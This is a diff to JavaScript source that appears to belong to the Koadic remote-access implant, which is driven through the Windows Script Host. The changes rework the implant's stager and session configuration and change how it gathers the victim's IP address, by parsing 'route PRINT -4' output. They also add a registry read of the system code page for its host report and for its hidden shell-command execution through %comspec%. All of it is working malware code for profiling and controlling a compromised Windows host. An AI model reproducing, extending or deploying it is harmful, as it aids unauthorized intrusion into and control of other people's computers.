@@ -1,15 +1,12 @@
-var Koadic =
-{
-    FS : new ActiveXObject("Scripting.FileSystemObject"),
-    WS : new ActiveXObject("WScript.Shell"),
+var Koadic = {};
 
-    STAGER : "~URL~",
-    SESSIONKEY : "~SESSIONKEY~",
-    JOBKEY : "~JOBKEY~",
-    JOBKEYPATH : "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=",
-    EXPIRE : "~_EXPIREEPOCH_~"
-
-};
+Koadic.FS = new ActiveXObject("Scripting.FileSystemObject");
+Koadic.WS = new ActiveXObject("WScript.Shell");
+Koadic.STAGER = "~URL~";
+Koadic.SESSIONKEY = "~SESSIONKEY~";
+Koadic.JOBKEY = "~JOBKEY~";
+Koadic.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
+Koadic.EXPIRE = "~_EXPIREEPOCH_~";
 
 /**
  * Sleeps the current thread
@@ -269,23 +266,62 @@ Koadic.user.IPAddrs = function()
 
 Koadic.user.IPAddrs = function()
 {
+    // try
+    // {
+    //     var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
+    //     var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
+    //     return ip;
+    // }
+    // catch(e)
+    // {
+    //     try
+    //     {
+    //         var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
+    //         return ip;
+    //     }
+    //     // we might need to add more conditions :/
+    //     catch(e)
+    //     {}
+    // }
+
     try
     {
-        var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
-        var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
-        return ip;
+        var routeprint4 = Koadic.shell.exec("route PRINT -4", "%TEMP%\\"+Koadic.uuid()+".txt");
+        var res = routeprint4.split("\r\n");
+        for (var i=0; i < res.length; i++)
+        {
+            line = res[i].split(" ");
+            // count how many 0.0.0.0 entries in this array
+            zerocount = 0;
+            // count how many entries in this array aren't empty
+            itemcount = 0;
+            // flag for when this is the line we're looking for
+            correctflag = false;
+            for (var j=0; j < line.length; j++)
+            {
+                // empty string evals to false
+                if (line[j])
+                {
+                    itemcount += 1;
+                    // ip addr is in the 4th column
+                    if (itemcount == 4 && correctflag) {
+                        return line[j];
+                    }
+                }
+                if (line[j] == "0.0.0.0")
+                {
+                    zerocount += 1;
+                    // 2 occurances of the 'any' interface in a single line is what we're looking for
+                    if (zerocount == 2)
+                    {
+                        correctflag = true;
+                    }
+                }
+            }
+        }
     }
     catch(e)
-    {
-        try
-        {
-            var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
-            return ip;
-        }
-        // we might need to add more conditions :/
-        catch(e)
-        {}
-    }
+    {}
 
     return "";
 }
@@ -315,6 +351,8 @@ Koadic.user.info = function()
     info += "~~~" + Koadic.user.Arch();
     info += "~~~" + Koadic.user.CWD();
     info += "~~~" + Koadic.user.IPAddrs();
+    info += "~~~" + Koadic.user.encoder();
+    info += "~~~" + Koadic.user.shellchcp();
 
     return info;
 }
@@ -333,6 +371,20 @@ Koadic.user.encoder = function()
     }
 }
 //user.encoder.end
+
+Koadic.user.shellchcp = function()
+{
+    try
+    {
+        var encoder = Koadic.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
+        return encoder;
+    }
+    catch(e)
+    {
+        return "437";
+    }
+}
+
 Koadic.work = {};
 
 /*
@@ -811,7 +863,7 @@ Koadic.shell = {};
 //shell.exec.start
 Koadic.shell.exec = function(cmd, stdOutPath)
 {
-    cmd = "chcp " + Koadic.user.encoder() + " & " + cmd;
+    cmd = "chcp " + Koadic.user.shellchcp() + " & " + cmd;
     var c = "%comspec% /q /c " + cmd + " 1> " + Koadic.file.getPath(stdOutPath);
     c += " 2>&1";
     Koadic.WS.Run(c, 0, true);
@@ -915,4 +967,3 @@ Koadic.file.deleteFile = function(path)
     Koadic.FS.DeleteFile(Koadic.file.getPath(path), true);
 };
 //file.deleteFile.end
-
